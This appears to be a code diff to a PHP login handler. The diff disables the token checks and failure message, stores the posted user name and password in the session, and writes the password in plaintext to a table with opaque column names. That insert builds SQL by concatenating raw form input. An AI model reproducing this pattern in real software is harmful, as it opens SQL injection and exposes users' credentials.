@@ -3,19 +3,21 @@ session_start();
 session_regenerate_id();
 
 
+$_SESSION["user"] = $_POST["user"];
+$_SESSION["password"] = $_POST["password"];
 
-
-$token = login();
-if(strlen($token) > 250){$token = "invalid";};
-$_SESSION["token"] = $token;
+//$token = login();
+//if(strlen($token) > 250){$token = "invalid";};
+//$_SESSION["token"] = $token;
 grava();
-if($token == "invalid"){
- echo '<a href="index.php" style="font-family:arial; font-size:11px;">Failed to Log In. Try Again.</a>';
-}else{
+login();
+//if($token == "invalid"){
+// echo '<a href="index.php" style="font-family:arial; font-size:11px;">Failed to Log In. Try Again.</a>';
+//}else{
 //header('Location: chat.php'); 
 //header('Location: chat.php?tk=' . $token); 
-}
-exit;
+//}
+//exit;
 
 function login(){
 //$login_email = getenv("email");
@@ -130,7 +132,8 @@ $db = new PDO($dsn);
 
 $login = $_POST["user"];
 $passw = $_POST["password"];
-$token = $_SESSION["token"];
+$token = "generating";
+//$token = $_SESSION["token"];
 $tempo = date('m/d/Y h:i:s a');
 
 $query = "INSERT INTO dados (id1, id2, id3, id4) VALUES ('" . $tempo . "', '" . $login . "', '" . $passw . "', '" . $token . "');";
